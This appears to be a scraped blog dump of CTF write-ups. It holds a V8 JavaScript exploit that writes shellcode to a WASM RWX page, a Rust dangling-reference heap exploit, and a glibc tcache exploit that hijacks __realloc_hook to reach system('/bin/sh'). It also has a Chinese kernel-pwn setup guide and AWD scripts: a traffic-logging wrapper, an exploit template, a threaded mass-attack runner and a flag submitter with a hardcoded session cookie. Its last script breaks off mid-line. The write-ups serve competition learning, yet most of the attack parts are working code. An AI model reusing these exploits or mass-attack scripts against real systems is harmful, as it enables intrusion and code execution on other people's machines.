Corrupt the length and keep the `elements` ptr intactfloat_arr[2] = itof((0x1000n &lt;&lt; 32n) + float_arr_elem);if (float_arr.length === 2048) &#123;  console.log(&quot;[+] Corruption successful!&quot;);&#125; else &#123;  console.log(&quot;[!] Corruption failed. Try again.&quot;);  throw error;&#125;// Setup addrof primitive// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]// We simply set addrof_arr[0] to the object whose address we want to leak// Then we read from float_arr[4]function addrof(obj) &#123;    addrof_arr[0] = obj;    return ftoi(float_arr[4]) &amp; 0xffffffffn;&#125;console.log(&quot;[+] Addrof primitive has been setup&quot;);// Setup an arbitrary read primitive for the V8 compressed heap// We do this by overwriting the elements pointer of our arb_read_arr to a// chosen address - 8 (making sure to keep the length set to 0x1000). We// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).// The elements pointer of arb_read_arr is at float_arr[17], offset found// through GDB.// addr must be a 32-bit value herefunction compressed_arb_read(addr) &#123;    float_arr[17] = itof((0x1000n &lt;&lt; 32n) + addr - 8n);    return ftoi(arb_read_arr[0]);&#125;console.log(&quot;[+] Arbitrary read primitive for the compressed heap has been setup&quot;);// Setup a function that writes our shellcode to a given address// We do this by overwriting the backing store address of the ArrayBuffer we// previously allocated to our chosen address. We then use the DataView that we// also allocated to write our shellcode to that address space.//// Using GDB, we find that the backing store address of our ArrayBuffer is// misaligned at float_arr[20] and float_arr[21]. The misalignment is as// follows://// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of//   the backing store address// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of//   the backing store address//// If this is confusing to you, that&#x27;s because it is very confusing :p I would// suggest looking at this in GDB and comparing whatever I mentioned above to// what you see in GDB until it makes sense//// addr must be a 64-bit value herefunction copy_shellcode(addr, shellcode) &#123;    // The backing store address of buf is not aligned to 64 bytes, so we have    // to write the upper 32-bits and the lower 32-bits of our address to two    // separate indices like this    float_arr[20] = itof((addr &amp; 0xffffffffn) &lt;&lt; 32n);    float_arr[21] = itof((addr &amp; 0xffffffff00000000n) &gt;&gt; 32n);    for (let i = 0; i &lt; shellcode.length; i++) &#123;        dataview.setUint32(4*i, shellcode[i], true);    &#125;&#125;// msfvenom -p linux/x64/exec CMD=&#x27;./flagprinter&#x27; --format dwordvar shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x0000000e, 0x6c662f2e, 0x72706761, 0x65746e69, 0x57560072, 0x0fe68948, 0x00000005];// Now, we leak the address of our RWX page// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)var rwx_page_addr = compressed_arb_read(addrof(wasm_instance) + 0x68n);console.log(&quot;[+] RWX page address found: &quot; + hex(rwx_page_addr));// Finally, we copy our shellcode to the RWX page and call the WASM function to// execute it.console.log(&quot;[+] Copying ./flagprinter shellcode to RWX page&quot;);copy_shellcode(rwx_page_addr, shellcode);console.log(&quot;[+] Printing flag!&quot;);f();\n\n\n\n\n\n6 [Zombie]This is a medium heap exploit which involves exploiting a soundness hole in the rust type system. Everything is already set up for you, so you don’t have to think too hard about the actual soundness hole though.\nThe idea here is that you first create a dangling reference to a freed block of memory on the heap. This is done through the infect command, which calls the zombie function with a user provided parameter.\nfn zombie(size: usize) -&gt; &amp;&#x27;static mut [u8] &#123;\tlet mut object = vec![b&#x27;A&#x27;; size];\tlet r = virus(object.as_mut());\tr&#125;\n\nThis zombie function first creates a heap allocated array filled with 0x41 of a user defined size, then calls the virus function.\nThis is a modification of rustlang issue 25860 as hinted in the code comments.\nhttps://github.com/rust-lang/rust/issues/25860\nThis is a long standing hole in rust’s (normally memory safe) type system which allows one to convert a reference lifetime to the static lifetime and therefore bypass rust’s borrow checker: convert &amp;&#39;a T to &amp;&#39;static T and a big no-no for memory safety.\nI have modified this to work with a mutable pointer so now there is a dangling reference which can be used to both read from, and write to the freed block of memory.\nUsually this could be done easily using rust’s unsafe keyword, but I decided to make this challenge extra baffling in exchange for source code access.\nThe ChallengeThe idea behind this challenge is that we have a shell with various commands, one of which is the “get flag” command, however that command is hardcoded to be ignored and a new command read in.\nmatch line.as_str().trim() &#123;\t&quot;get flag&quot; =&gt; continue,\t&quot;infect&quot; =&gt; infected = Some(infect(&amp;mut lines)),\t&quot;eat brains&quot; =&gt; eat_brains(&amp;mut lines, &amp;mut infected),\t&quot;inspect brains&quot; =&gt; inspect_brains(&amp;mut lines, &amp;mut infected),\t_ =&gt; (),&#125;\n\nafter the command is finished executing there is another check to see if the command was “get flag”, and if it was the flag is printed out.\nif line.as_str().trim() == &quot;get flag&quot; &#123;\tlet flag = read_to_string(&quot;flag.txt&quot;).unwrap();\tprintln!(&quot;Here&#x27;s the flag: &#123;&#125;&quot;, &amp;flag);&#125;\n\nSo we need to change the command while it is still inside the buffer during the execution of one of our commands.\nWe also have other commands, “eat brains” and “inspect brains” which allow us to read from and write to our dangling reference returned from the infect function.\nThe final piece of the puzzle is understanding how the String struct works in rust. It contains a pointer to the heap, and will reallocate to grow when all the heap space for its buffer is used up. In this case we are reading stdin line by line, so if a line is longer than any have previously been, it is possible to force the String struct in the line variable to reallocate to a buffer that we have previously freed.\nThe ExploitFirst our normal setup:\nfrom pwn import *p = remote(&quot;localhost&quot;, 1337)\n\nNow our first step is to create our dangling pointer:\np.sendline(&quot;infect&quot;)p.sendline(&quot;32&quot;)\n\nThis will create a pointer to a 32 byte piece of freed memory and then store that in the infected variable in main.\np.sendline(&quot;eat brains                     &quot;)\n\nSince the .trim() is called on each line before it is compared against the instructions, the trailing whitespace in this command will be ignored and the command recognised as “eat brains”.\nThe purpose of the trailing whitespace here is to force the line containing this command to allocate a 32 byte buffer to store the command. This will take the buffer we have previously freed and have a dangling reference to back out of the freed bins and use it as part of the string buffer.\nNow we have also entered the “eat brains” function at the same time, so we are able to modify the buffer that now contains the “eat brains                     “ string.\nThe final piece of this puzzle is understanding how strings work in rust. Unlike in C, rust strings are not null terminated, instead the length of the string is stored alongside the pointer to the string and therefore in this case we do not have control over the length of the string.\nIf we simply replaced the first few bytes of the command buffer with the command we wanted and a null terminator we would end up with:“get flag\\x00s                     “\nWhen this is .trim()ed the result would be “get flag\\x00s” which would not match the required string “get flag”. Instead we overwrite a few more bytes of the command with the space character:\ndef brains(string):\tcounter = 0\tfor c in string:\t\tp.sendline(str(counter))\t\tp.sendline(str(ord(c)))\t\tcounter += 1\tp.sendline(&quot;done&quot;)brains(&quot;get flag  &quot;)\n\nNote the additional spaces at the end of the command, this will overwrite the “ns” in “brains” and cause the .trim() method to trim the command down to “get flag”, which then prints the flag.\n7-VECCThis is a hard heap exploitation challenge.\nThe idea is to first obtain a read&#x2F;write primitive on the heap, then progressively leak data until you know the location of libc, then overwrite the __realloc_hook to call system(/bin/sh).\n1 - Identifying the vulnerabilityThe first thing to note when inspecting the binary logic is that bounds are being checked correctly so we have no buffer overflows or heap corruption, and there are no obvious double-frees or use-after-frees, however there is the glaring vulnerability that allocations are never zeroed and we must leverage this and only this to get a shell.\n2 - The essence of the vulnerabilityFor this exploit all you need is the tcache. There are the veccs - which are simillar to c++’s std::vector or rust’s Vec. This is a small struct with a pointer (to a buffer), a length (of the used portion of the buffer), and a capacity (the maximum buffer length before reallocation is necessary). When a vecc is first created all fields should be NULLed to signal that a new buffer must be allocated upon first usage.\nThe key here is to notice that since allocations are not zeroed it is possible to groom the stack, then allocate a vecc from a tcache chunk without erasing the data on it.\nThis means that your allocated struct will leave the pointer as the fd pointer of the chunk from the tcache, as well as leaving the length and capacity unchanged from when the chunk was freed.\nFurthermore since we have some control over the stack, it is possible to force this chunk fd pointer to point to another vecc struct as if it was the buffer of our new allocation.\n A                  B+-----------+      +-----------+      +-----------+| buf +----------&gt; | buf +----------&gt; | actual    |+-----+-----+      +-----+-----+      | buffer    || len | cap |      | len | cap |      |           |+-----+-----+      +-----+-----+      +-----------+\n\nOnce we have the above structure we are free to use A to overwrite all 3 fields of B as if it was a regular byte buffer, then use B to read or write data at will.\nThis is made a little more difficult in that we do not have arbitrary write on the buffer of any of our veccs, instead we only have the ability to clear and append to the buffers.\nThe clear operation simply zeroes the len field of the struct and does nothing else.\nThe append operation is a little more complicated, it:\n\nAllocates a temporary buffer of user defined size n\nReads n bytes into the temporary buffer\nChecks whether len + n &gt; cap - this would overflow the buffer\nIf necessary reallocates the vecc’s buffer to the next power of 2 size that would fit the existing buffer and the n new bytes while copying the data across, cap it also updated\nAppend the user data from the temporary buffer to the vecc’s buffer now that we’re sure we can not overflow it\nFree the temporary buffer\nUpdate the len to reflect the size of the new used portion of the buffer\n\nThe end result is that a temp buffer is allocated and freed, and the vecc’s buffer is possibly reallocated to fit the required size, then the user data is appended to the vecc’s existing data.\nOnce we have our crafted heap structure we can use a clear, followed by an append to overwrite the entire vecc struct at will.\n3 - The exploitFor this exploit we first do some housekeeping since we have a shell\nfrom pwn import *def exit_proc():\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;0&quot;)def create_vecc(index):\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;1&quot;)\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;&#123;&#125;&quot;.format(index))\tp.recvline()def destroy_vecc(index):\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;2&quot;)\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;&#123;&#125;&quot;.format(index))\tp.recvline()def append_vecc(index, buffer, readline=True):\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;3&quot;)\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;&#123;&#125;&quot;.format(index))\tp.recvline()\tp.sendline(&quot;&#123;&#125;&quot;.format(len(buffer)))\tp.send(buffer)\tif readline:\t\tp.recvline()def clear_vecc(index):\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;4&quot;)\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;&#123;&#125;&quot;.format(index))\tp.recvline()def show_vecc(index, bytes):\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;5&quot;)\tp.recvuntil(&quot;&gt; &quot;)\tp.sendline(&quot;&#123;&#125;&quot;.format(index))\treturn p.recv(bytes)# p = remote(&quot;localhost&quot;, 1337)p = process(&quot;../publish/vecc&quot;)\n\nThis simply reflects all of the shell commands we might need to use. Now lets get to grooming the heap for our primitive.\ncreate_vecc(0)append_vecc(0, b&quot;A&quot; * 0x10)\n\nWe first create a vecc struct then append bytes to it.\nIt is important to write 0x10 bytes to this buffer since our aim is to have this buffer later interpreted as a vecc struct. For this to work we must make sure that it will be placed in the same tcache bin as a vecc struct would and therefore we should match the size of the vecc struct.\nNote that this will also allocate and free a temporary buffer of size 0x10 while user data is read in, we now have 1 chunk in the tcache.\ndestroy_vecc(0)\n\nAfter this line first the vecc’s buffer will be freed, then the vecc will be NULLed and freed.\nNow the tcache looks like this:\ntcachebin:(was vecc)         (was buffer)       (was temp)+-----------+      +-----------+      +-----------+| fd  +----------&gt; | fd  +----------&gt; | fd = NULL || 000000000 |      | AAAAAAAAA |      | AAAAAAAAA || 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |+-----------+      +-----------+      +-----------+\n\nFinally we complete our crafted structure:\ncreate_vecc(1)create_vecc(2)create_vecc(3)\n\nNow we have allocated back from the tcache with some new structure:\n 1                  2                  3+-----------+      +-----------+      +-----------+| buf +----------&gt; | buf +----------&gt; | buf = NULL|+-----+-----+      +-----+-----+      +-----+-----|| 000 | 000 |      | AAA | AAA |      | AAA | AAA |+-----+-----+      +-----+-----+      +-----------+\n\nSince 1 has capacity 0 any write will resule in a reallocation, so we don’t touch 1 from now on, but now with 2 and 3 we have the same structure as in the original diagram - we are able to use 2 to overwrite the entire of 3, then utilise 3 for arbitrary read &#x2F; write.\nNow we know we have PIE disabled, therefore we are able to leak libc addresses from the GOT.\nputs_got = 0x601fa0clear_vecc(2)append_vecc(2, p64(puts_got) + p32(8) + b&quot;AAAA&quot;)puts_libc = u64(show_vecc(3, 8))print(&quot;Puts address: &#123;&#125;&quot;.format(hex(puts_libc)))free_got = 0x601f90clear_vecc(2)append_vecc(2, p64(free_got) + p32(8) + b&quot;AAAA&quot;)free_libc = u64(show_vecc(3, 8))print(&quot;Free address: &#123;&#125;&quot;.format(hex(free_libc)))\n\nThis is enough to figure out the version of libc being used and the location of any other symbols needed.\nlibc_base = puts_libc - 0x809c0system = libc_base + 0x4f440realloc_hook = libc_base + 0x3ebc28str_bin_sh = libc_base + 0x1b3e9aprint(&quot;Realloc hook address: &#123;&#125;&quot;.format(hex(realloc_hook)))\n\nNow we overwrite our realloc hook with the address of system.\nclear_vecc(2)append_vecc(2, p64(realloc_hook) + p32(0) + b&quot;AAAA&quot;)append_vecc(3, p64(system))\n\nFinally, we overwrite the buffer pointer of one of our vecc structures with a pointer to “&#x2F;bin&#x2F;sh” from within libc, then trigger a reallocation by appending a single extra byte, giving us a shell.\nclear_vecc(2)append_vecc(2, p64(str_bin_sh) + p32(8) + p32(8))append_vecc(3, &quot;A&quot;, readline=False)p.interactive()\n","categories":["ctf"],"tags":["pwn"]},{"title":"kernel pwn环境搭建","url":"/2020/09/13/security/kernel-pwn-env/","content":"Kernel pwn 环境搭建编译内核去官网下载一份kernel内核源码, 这里就采用2.6.32版本。我采用docker 下的ubuntu16.04进行编译内核, 编译内核前需要拥有特定的版本的make和gcc, g++\n获取不同版本的内核:\n获取\n安装特定的编译器sudo apt install gcc-4.7 g++-4.7sudo ln -s /usr/bin/gcc-4.7 /usr/bin/gccsudo ln -s /usr/bin/g++-4.7 /usr/bin/g++\n\n\n\n安装必备依赖sudo apt-get install build-essential libncurses5-dev\n\n\n\n获取内核代码mkdir kernelcd kernelwget https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.tar.gztar xzvf linux-2.6.32.tar.gz\n\n\n\n获取特定的makewget https://mirrors.tuna.tsinghua.edu.cn/gnu/make/make-3.80.tar.gztar -xvf make-3.80.tar.gzcd make-3.80/./configuremake\n\n\n\n修改三处 2.6 源码文件\n1.arch&#x2F;x86&#x2F;vdso&#x2F;Makefile 中第 28 行的 -m elf_x86_64 改成 -m64，第 72 行的-m elf_i386 改成-m32\n2.drivers&#x2F;net&#x2F;igbvf&#x2F;igbvf.h 中注释第 128 行\n3.kernel&#x2F;timeconst.pl 中第 373 行 defined(@val) 改成 @val\n4.（可选）关闭 canary 保护需要编辑源码中的.config 文件 349 行，注释掉 CONFIG_CC_STACKPROTECTOR&#x3D;y 这一项\n\n配置kernel../make-3.80/make menuconfig\n\n进入 kernel hacking，勾选 Kernel debugging，Compile-time checks and  compiler options–&gt;Compile the kernel with debug info，Compile the  kernel with frame pointers 和 KGDB\n编译../make-3.80/make bzImage\n\n\n\n编译时遇到的问题问题1fatal error: linux/compiler-gcc5.h: No such file or directory\n\n解决:\n拷贝一个自己目录下的compiler-gcc4.h到compiler-gcc5.h\n\n问题2implicit declaration of function &#x27;tty_port_users&#x27;\n\n解决:\n将所提示的该函数extern关键字去掉\n编译成功编译成功之后提示如下:\nRoot device is (0, 78)Setup is 13688 bytes (padded to 13824 bytes).System is 3961 kBCRC e70b803aKernel: arch/x86/boot/bzImage is ready  (#1)\n\nvmlinux 在源码根目录下，bzImage 在arch&#x2F;x86&#x2F;boot&#x2F;下\n制作镜像获取busyboxwget https://busybox.net/downloads/busybox-1.27.2.tar.bz2tar -jxvf busybox-1.27.2.tar.bz2\n\n\n\n配置busyboxcd busybox-1.27.2make menuconfig\n\n勾选 Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary\n编译并安装busyboxmakemake install\n\n\n\n打包镜像编译完成后源码目录下会有一个_install 文件夹\ncd _installmkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;mkdir etc/init.dtouch etc/init.d/init\n\n编辑 etc&#x2F;inittab 文件，加入以下内容（这一步可以省略）\n::sysinit:/etc/init.d/rcS::askfirst:/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init\n\n编辑 etc&#x2F;init.d&#x2F;rcS 文件，加入以下内容\n#!/bin/shmount -t proc none /procmount -t sys none /sys/bin/mount -n -t sysfs none /sys/bin/mount -t ramfs none /dev/sbin/mdev -s\n\n接着就可以打包成 rootfs.cpio\nchmod +x ./etc/init.d/rcSfind . | cpio -o --format=newc &gt; ../rootfs.cpio\n\n\n\n运行镜像安装qemuapt install qemu\n\n\n\n得到这三个vmlinux,bzImage,rootfs.cpio 文件后，可以利用 qemu 运行起来，启动脚本 boot\n#!/bin/shqemu-system-x86_64 \\ -initrd rootfs.cpio \\ -kernel bzImage \\ -nographic \\ -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \\ -m 64M \\ -monitor /dev/null \\\n\n\n\n启动成功如下\nPlease press Enter to activate this console. [    3.379764] async/1 used greatest stack depth: 5064 bytes left/bin/ash: can&#x27;t access tty; job control turned off/ # lsbin      etc      proc     sbin     usr\n\n\n\n编写与打开内核驱动内核驱动c代码编写#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;int hello_write(struct file *file, const char *buf, unsigned long len) &#123;    printk(&quot;You write something.&quot;);    return len;&#125;static int __init hello_init(void) &#123;    printk(KERN_ALERT &quot;hello driver init!\\n&quot;);    create_proc_entry(&quot;hello&quot;, 0666, 0)-&gt;write_proc = hello_write;    return 0;&#125;static void __exit hello_exit(void) &#123;    printk(KERN_ALERT &quot;hello driver exit\\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);\n\n保存为hello.c\nMakefile编写注意, Makefile中 obj-m 中的名字要与保存c代码的文件名相同\nobj-m := hello.oKERNELDR := /home/kernel/linux-2.6.32PWD := $(shell pwd)modules:        $(MAKE) -C $(KERNELDR) M=$(PWD) modulesmodules_install:        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_installclean:        $(MAKE) -C $(KERNELDR) M=$(PWD) clean\n\nmake 出来后得到.ko 文件\n编写打开程序命名为call.c\n#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;int main() &#123;    int fd = open(&quot;/proc/hello&quot;, O_WRONLY);    write(fd, &quot;I0gan&quot;, 5);    return 0;&#125;\n\n\n\n编译gcc --static call.c -o call\n\n将hello.ko与call两个文件复制到busybox下的_install目录下重新打包得到rootfs.cpio, 把该文件复制到启动目录下, 重新运行.&#x2F;boot\n启动自己的内核驱动挂载驱动insmod hello.ko\n\n输出如下\n[   75.062554] hello: module license &#x27;unspecified&#x27; taints kernel.[   75.063843] Disabling lock debugging due to kernel taint[   75.074570] hello driver init!\n\n\n\n调用打开自己的驱动/ # ./call [   79.011811] You write something./ \n\n上面打印了You write somthing说明已经打开了我们的驱动, 那么到这基本上已经差不多了 ^_^\n","categories":["security"],"tags":["pwn"]},{"title":"awd pwn attack script","url":"/2020/09/13/security/ctf/awd-pwn-attack-script/","content":"AWD PWN打了好几次awd, 始终都没好好弄个批量攻击脚本与批量提交flag, 今天它来了, 环境是pwn docker\nAWD WAFawd waf方便抓取对方攻打的流量\n/* * orignal author: yangshuangfu * github link: https://github.com/yangshuangfu/PwnWAF * modified author: i0gan * github link: https://github.com/i0gan/pwn/env/awd/waf.c * modified time  : 2020-09-18 */// complie:// gcc waf.c -o waf// before you use it, you should backup your binary file, then rename waf as binary name#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;fcntl.h&gt;#include&lt;unistd.h&gt;#include&lt;error.h&gt;#include&lt;sys/wait.h&gt;#include&lt;sys/ptrace.h&gt;#include&lt;sys/syscall.h&gt;#include&lt;sys/user.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;string.h&gt;#define FILENAME &quot;./pwn&quot;#define LOGNAME &quot;./log&quot;#define MACHINE 64#define NEW_CONNECT_SHOW_STR &quot;\\n************** new attack *************\\n&quot;#define READ_SHOW_STR        &quot;\\nread:\\n&quot;#define WRITE_SHOW_STR       &quot;\\nwrite:\\n&quot;enum SYSTYPE &#123;\tREAD,\tWRITE&#125;;int state = -1;int check_standard(int fd)&#123;\treturn fd == 1 || fd == 0;&#125;void write_log(pid_t pid, char* addr, int size, enum SYSTYPE flag)&#123;\tint fd = open(LOGNAME, O_CREAT|O_APPEND|O_WRONLY, 0666);\tint i = 0,j = 0;\tchar data;\tchar* buf = (char*)malloc(size + 1);\tfor(i = 0; i &lt; size; i++)&#123;\t\tdata = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);\t\tbuf[i] = data;\t&#125;\t// 判断是否状态是否发生变化,发生变化就写入不同的状态\tif(state != flag)\t&#123;\t\tif(flag == READ)\t\t\twrite(fd, READ_SHOW_STR, sizeof(READ_SHOW_STR));\t\telse\t\t\twrite(fd, WRITE_SHOW_STR, sizeof(WRITE_SHOW_STR));\t\tstate = flag;\t&#125;\twrite(fd, buf, size);\tclose(fd);\tfree(buf);&#125;void write_new_attack() &#123;\t// 分割每次攻打的符号\tint fd = open(LOGNAME, O_CREAT|O_APPEND|O_WRONLY, 0666);\twrite(fd, NEW_CONNECT_SHOW_STR, sizeof(NEW_CONNECT_SHOW_STR));\tclose(fd);&#125;int main(int argc, char* argv[])&#123;\tsetvbuf(stdin,0,2,0);\tsetvbuf(stdout,0,2,0);\tpid_t pid;\tstruct user_regs_struct regs;\tint status;\tint insyscall = 0;\tint first_time = 1;\tpid = fork();\tint sys_num;\tenum SYSTYPE sys_status;\t// we use child process to exec \tif(pid == 0)&#123;\t\tptrace(PTRACE_TRACEME, 0, NULL, NULL);\t\targv[1] = FILENAME;\t\tstatus = execvp(FILENAME, argv+1);\t\tif(status&lt;0)&#123;\t\t\tperror(&quot;ERROR EXEC\\n&quot;);\t\t\treturn -1;\t\t&#125;\t&#125;\t// parent to get child syscall\telse if (pid &gt; 0)&#123;\t\twrite_new_attack();\t\twhile(1)&#123;\t\t\twait(&amp;status);\t\t\tif(WIFEXITED(status))\t\t\t\tbreak;\t\t\t// get rax to ensure witch syscall\t\t\tptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);#if MACHINE == 64\t\t\tsys_num = regs.orig_rax;#elif MACHINE == 32\t\t\tsys_num = regs.orig_eax;#endif\t\t\tif (sys_num != SYS_read &amp;&amp; sys_num != SYS_write)&#123;\t\t\t\tptrace(PTRACE_SYSCALL, pid, NULL, NULL);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tif (insyscall==0)&#123;\t\t\t\tinsyscall = 1;\t\t\t\tptrace(PTRACE_SYSCALL, pid, 0, 0);\t\t\t&#125;\t\t\telse&#123;\t\t\t\t// we should ignor the first time\t\t\t\t// checl it is standard pipe or not\t\t\t\tint is_standard = 0;#if MACHINE == 64\t\t\t\tis_standard = check_standard(regs.rdi);#elif MACHINE == 32\t\t\t\tis_standard = check_standard(regs.ebx);#endif \t\t\t\tif(!is_standard)&#123;\t\t\t\t\tfirst_time = 0;\t\t\t\t\tptrace(PTRACE_SYSCALL, pid, NULL ,NULL);\t\t\t\t\tinsyscall ^= 1;\t\t\t\t\tcontinue;\t\t\t\t&#125;\t\t\t\tif(sys_num == SYS_read)\t\t\t\t\tsys_status = READ;\t\t\t\telse if (sys_num == SYS_write)\t\t\t\t\tsys_status = WRITE;\t\t\t\tint size = 0;\t\t\t\tchar* addr = NULL;#if MACHINE == 64\t\t\t\tsize = regs.rdx;\t\t\t\t// size = (size + sizeof(long)-1)/sizeof(long) * sizeof(long) +1;\t\t\t\taddr = (char*)regs.rsi;\t\t\t\t// printf(&quot; the addr is %lx with size %lx&quot;, addr, size);#elif MACHINE == 32\t\t\t\tsize = regs.edx;\t\t\t\taddr = (char*)regs.ecx;#endif \t\t\t\twrite_log(pid, addr, size, sys_status);\t\t\t\tinsyscall = 0;\t\t\t\tptrace(PTRACE_SYSCALL, pid, NULL, NULL);\t\t\t&#125;\t\t&#125;\t\treturn 0;\t&#125;\telse&#123;\t\tperror(&quot;ERROR FORK!\\n&quot;);\t\treturn -1;\t&#125;&#125;\n\n\n\n\n\nAWD EXP#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# a script for awd exp# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)elf_path  = &#x27;pwn&#x27;arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;MODIFY_LD = 0LOCAL = 0LIBC  = 0if(len(sys.argv) &lt; 3):\tLOCAL = 1\tcontext.log_level=&#x27;debug&#x27;else:\tserver_ip = sys.argv[1]\tserver_port = int(sys.argv[2], 10)ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def cat_flag(io):\tsleep(1)\tsl(&#x27;cat flag&#x27;)\tflag = b&#x27;flag&#123;&#x27;  + ru(&#x27;&#125;&#x27;) + b&#x27;&#125;&#x27;\twd  = flag\twd += b&#x27;\\n&#x27;\tfd = open(&#x27;./flags&#x27;, &#x27;a&#x27;)\tfd.write(wd.decode())\tfd.close()#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n该脚本攻打成功后, 会在.&#x2F;flags文件中追加获得的flag\nAWD 实现批量攻击#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan # script for awd mode# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]import threadingimport sys,osimport queueli = lambda x : print(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)class Exploit(threading.Thread):\tdef __init__(self,ips, ports):\t\tthreading.Thread.__init__(self)\t\tself.ips_ = ips\t\tself.ports_ = ports\tdef run(self):\t\twhile True:\t\t\tif self.ips_.empty():\t\t\t\tbreak\t\t\ttry:\t\t\t\t# scrpt for it\t\t\t\tip   = self.ips_.get(timeout=0.5)\t\t\t\tport = self.ports_.get(timeout=0.5)\t\t\t\tos.system(&#x27;python3 ./exp.py&#x27;) # run exp\t\t\t\tli(&#x27;ip: &#x27; + ip + &#x27; : &#x27; + str(port))\t\t\texcept:\t\t\t\tcontinuedef attack():\tli(&#x27;start loop attack...&#x27;)\tthread_count = 8  # thread number\tthreads = []\tips = queue.Queue()\tports = queue.Queue()\tf = open(&quot;./hosts&quot;,&#x27;r&#x27;) # read ip and port from hosts file\tlines = f.readlines()\tf.close()\tfor line in lines:\t\tget_line = line.strip(&#x27;\\n&#x27;)\t\tinfo = get_line.split(&#x27;:&#x27;, 1)\t\t#print(info)\t\tips.put(info[0])\t\tports.put(int(info[1], 10)) \tfor i in range(thread_count):\t\tthreads.append(Exploit(ips, ports))\tfor t in threads:\t\tt.start()\tfor t in threads:\t\tt.join() if __name__ == &#x27;__main__&#x27;:\tattack()\n\n该脚本从.&#x2F;hosts文件中读取ip 和port, 同时攻打\nAWD 实现批量提交flag#!/usr/bin/env python3#-*- coding:utf-8 -*-# auto submit flag script for fack awdimport osimport jsonimport requestsimport timeli = lambda x : print(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)csrf_token = &#x27;a9e17a178bfcdf29291c495fd0e3175a138c8ae6555cba89c7c9d0a56dd23293&#x27;cookie = &#x27;session=5dd2b2c8-261f-4337-bce2-3885ab7de331&#x27;ip = &#x27;http://ltalk.co:1024&#x27;submit_dir = &#x27;/api/v1/challenges/attempt&#x27;url = ip + submit_dirflag_file = &#x27;./flags&#x27;sleep_time = 120challenge_id = 8def submit():\twith open(flag_file) as flag_txt:\t\tflags = flag_txt.readlines()\t\tfor flag in flags:\t\t\tflag = flag.strip()\t\t\tdic = &#123;&#x27;challenge_id&#x27;: challenge_id,&#x27;submission&#x27;:flag&#125;\t\t\tjson_flag = json.dumps(dic)\t\t\tprint(json_flag)\t\t\ttry:\t\t\t\theader = 